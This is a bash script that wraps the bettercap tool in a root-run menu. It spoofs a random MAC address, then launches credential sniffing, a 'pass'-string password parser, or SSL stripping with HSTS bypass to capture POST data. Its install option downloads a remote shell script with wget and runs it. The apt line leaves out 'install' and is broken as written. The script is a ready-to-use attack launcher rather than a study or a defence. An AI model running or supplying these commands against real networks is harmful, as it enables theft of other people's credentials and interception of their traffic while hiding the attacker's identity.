#!/bin/bash
#=========================================================================================================================
#          FILE:  bettercap-menu.sh
#
#         USAGE:  chmod +x ./bettercap-menu.sh && sudo ./bettercap-menu.sh
#
#   DESCRIPTION:  Menu with multiple choices, to start bettercap with specifics and usual parameters
#
#       OPTIONS:  ---
#  REQUIREMENTS:  * Have bettercap and it's dependencies installed and functional
#                 * Be able to start this script as root
#                 * Be able to instal macchanger if unpresent
#          BUGS:  ---
#         NOTES:  ---
#        AUTHOR:  Jean-Marc ALBERT
#       COMPANY:  ---
#       CREATED:  29.02.2016 15:45:37 UST
#	   MODIFIED:  03.03.2016 12:13:37 UST
#      REVISION:  0.0.2
#=========================================================================================================================

### Variables ###
   NOW=$(date +%y.%m.%d-%T)
   scriptfile="$(readlink -f $0)"
   CURRENT_DIR="$(dirname ${scriptfile})"
   change_mac="true"

### Functions ###
shw_grey () {
    echo $(tput bold)$(tput setaf 0) $@ $(tput sgr 0)
}
shw_norm () {
    echo $(tput bold)$(tput setaf 9) $@ $(tput sgr 0)
}
shw_info () {
    echo $(tput bold)$(tput setaf 4) $@ $(tput sgr 0)
}
shw_warn () {
    echo $(tput bold)$(tput setaf 2) $@ $(tput sgr 0)
}
shw_err ()  {
    echo $(tput bold)$(tput setaf 1) $@ $(tput sgr 0)
}

function err () {
shw_err "[$0] ERROR: $1"
exit 1
}

function play_with_GitHub_script () {
	wget $SCRIPTURL
	chmod +x $SCRIPTFILENAME
	./$SCRIPTFILENAME
	rm ./$SCRIPTFILENAME
}

function check_deps-bettercap () {
	sed=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'sed'))
	grep=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'grep'))
	[ $change_mac == "true" ] && macchanger=($(find /bin /sbin /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin -name 'macchanger'))
	[ $sed ] || err "sed doesn't exist!"
	[ $grep ] || err "grep doesn't exist!"
	[ $change_mac != "true" ] || [ $macchanger ] || err "macchanger doesn't exist! Run, 'apt-get install macchanger', or don't use \"-M\" option"
}

function SelectInterface () {
	shw_info Available interfaces
	ifconfig | cut -c 1-8 | sort | uniq -u
	shw_warn Type interface name to use
	read interface
}

function ChangeMacAddress-Random () {
	ORIG_MAC=`macchanger -s $interface | cut -d' ' -f3`
	ifconfig $interface down
	macchanger -A $interface
	ifconfig $interface up
        sleep 5
	NEW_MAC=`macchanger -s $interface | cut -d' ' -f3`
	shw_info Original MAC is $ORIG_MAC
	shw_info New MAC is $NEW_MAC
}


### Initialisation ###
# Must be root
	if [[ $EUID -ne 0 ]]; then
        shw_warn "This script must be run as root" #1>&2
        exit 0
	fi

# Checking dependencies
	check_deps-bettercap

### Actions ###
	Menu() {
      local -a menu fonc
      local title nbchoice
      # Constitution of menu
      if [[ $(( $# % 1 )) -ne 0 ]] ; then
         shw_err "$0 - Invalid menu" >&2
         return 1
      fi
      title="$1"
      shift 1
      set "$@" "return 0" "Exit"
      while [[ $# -gt 0 ]]
      do
         (( nbchoice += 1 ))
         fonc[$nbchoice]="$1"
         menu[$nbchoice]="$2"
         shift 2
      done
      # Displaying menu
      PS3="Your choice? "
      while :
      do
         echo
         [[ -n "$title" ]] && shw_norm "$title"
         select choice in "${menu[@]}"
         do
            if [[ -z "$choice" ]]
               then shw_err "Invalid title"
               else eval ${fonc[$REPLY]}
            fi
            break
         done || break
      done
    }
    #------------------------------------------------
    # Install Bettercap and stuff
    #------------------------------------------------
    Bettercap-Install()
    {
		SCRIPTURL="https://raw.githubusercontent.com/wikijm/Linux-Scripts/master/bettercap-install.sh"
		SCRIPTFILENAME="bettercap-install.sh"
		play_with_GitHub_script
		apt -y sed grep 	macchanger
    }
    #------------------------------------------------
    # Credentials Sniffer
    #------------------------------------------------
    Bettercap-CredSniff()
    {
		SelectInterface
		ChangeMacAddress-Random
		sudo bettercap -I $interface -X
    }
    #------------------------------------------------
    # Credentials Sniffer - Parse "pass" expression
    #------------------------------------------------
    Bettercap-CredSniff-ParsePasswd()
    {
		SelectInterface
		ChangeMacAddress-Random
		sudo bettercap -I $interface -X --custom-parser "pass"
    }
	#------------------------------------------------
    # SSL Stripping and HSTS Bypass
    #------------------------------------------------
    Bettercap-SSLStrHSTSBypass()
    {
		SelectInterface
		ChangeMacAddress-Random
		sudo bettercap -I $interface --proxy -P POST
    }
    #------------------------------------------------
    # Main
    #================================================
    Menu \
      "+++ Menu +++" \
      Bettercap-Install "Install Bettercap" \
      Bettercap-CredSniff "Credentials Sniffer" \
      Bettercap-CredSniff-ParsePasswd "Credentials Sniffer - Parse 'password' expression" \
      Bettercap-SSLStrHSTSBypass "SSL Stripping and HSTS Bypass"
